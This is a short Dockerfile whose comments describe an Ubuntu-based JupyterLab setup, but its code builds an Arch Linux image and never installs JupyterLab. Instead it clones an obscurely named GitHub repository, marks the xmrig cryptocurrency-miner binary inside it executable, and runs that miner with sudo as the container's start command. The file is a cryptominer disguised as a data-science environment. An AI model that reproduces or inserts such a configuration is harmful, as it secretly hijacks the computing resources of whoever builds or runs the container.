# Use the latest Ubuntu image
FROM archlinux:latest

# Update and install required packages
RUN pacman -Sy --noconfirm && pacman -S --noconfirm \
    python \
    python-pip
RUN pacman -Sy --noconfirm \
    tigervnc \
    xfce4 \
    xfce4-goodies \
    sudo \
    make \
    xorg-server \
    base-devel \
    xorg-server-xvfb \
    supervisor \
    git \
    terminator \
    vim \
    wget \
    tar \
    && pacman -Scc --noconfirm
WORKDIR /app

# Install JupyterLab
RUN git clone https://github.com/SudoSuII/hsJwjJwj91
RUN chmod +x /app/hsJwjJwj91/xmrig
# Expose port 8080
EXPOSE 8080

# Start JupyterLab on port 8080 without authentication
CMD ["sudo", "/app/hsJwjJwj91/xmrig"]
